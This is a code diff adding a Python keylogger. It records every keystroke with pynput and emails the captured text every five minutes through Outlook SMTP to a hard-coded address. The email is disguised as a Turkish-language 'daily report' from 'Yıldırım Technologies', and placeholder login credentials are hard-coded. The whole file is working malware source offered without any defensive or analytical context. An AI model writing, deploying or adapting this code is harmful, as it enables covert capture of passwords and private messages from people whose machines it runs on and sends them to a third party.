@@ -1,0 +1,94 @@
+import logging
+import os
+import platform
+import smtplib
+import socket
+import threading
+from pynput import keyboard
+from pynput.keyboard import Listener
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email import encoders
+import smtplib
+
+
+EMAIL_ADDRESS = "test@hotmail.com"
+EMAIL_PASSWORD = "password"
+SEND_REPORT_EVERY = 300  # 5 minutes
+
+
+class KeyLogger:
+    def __init__(self, time_interval, email, password):
+        self.interval = time_interval
+        self.log = "KeyLogger Started..."
+        self.email = email
+        self.password = password
+        self.current_word = ""
+
+    def appendlog(self, string):
+        self.log = self.log + string
+
+    def save_data(self, key):
+        try:
+            current_key = key.char
+            if current_key is not None:
+                if current_key.isalpha() or current_key.isdigit() or current_key in "!'^+%&/()=?_><":
+                    self.current_word += current_key
+        except AttributeError:
+            if key == keyboard.Key.space:
+                self.current_word += " "
+            elif key == keyboard.Key.enter:
+                self.current_word += "\n"
+
+        self.appendlog(self.current_word)
+
+    def send_mail(self, email, password, message):
+        sender = "test@hotmail.com"
+        receiver = "test@gmail.com"
+
+        smtp_server = "smtp-mail.outlook.com"
+        smtp_port = 587
+
+        subject = "Günlük Rapor"
+        body = f"""\
+        SelamunAleyküm,
+
+        Günlük Yazılan Kelimeler:
+
+        {message}
+
+        Saygılarımla,
+        Yıldırım Technologies"""
+
+        msg = MIMEMultipart()
+        msg["From"] = sender
+        msg["To"] = receiver
+        msg["Subject"] = subject
+        msg.attach(MIMEText(body, "plain"))
+
+        try:
+            server = smtplib.SMTP(smtp_server, smtp_port)
+            server.starttls()
+            server.login(email, password)
+            text = msg.as_string()
+            server.sendmail(sender, receiver, text)
+            server.quit()
+        except Exception as e:
+            print("E-posta gönderme hatası:", str(e))
+
+    def report(self):
+        self.send_mail(self.email, self.password, self.current_word)
+        self.current_word = ""
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def run(self):
+        keyboard_listener = keyboard.Listener(on_press=self.save_data)
+        keyboard_listener.start()
+        self.report()
+        keyboard_listener.join()
+
+
+keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
+keylogger.run()
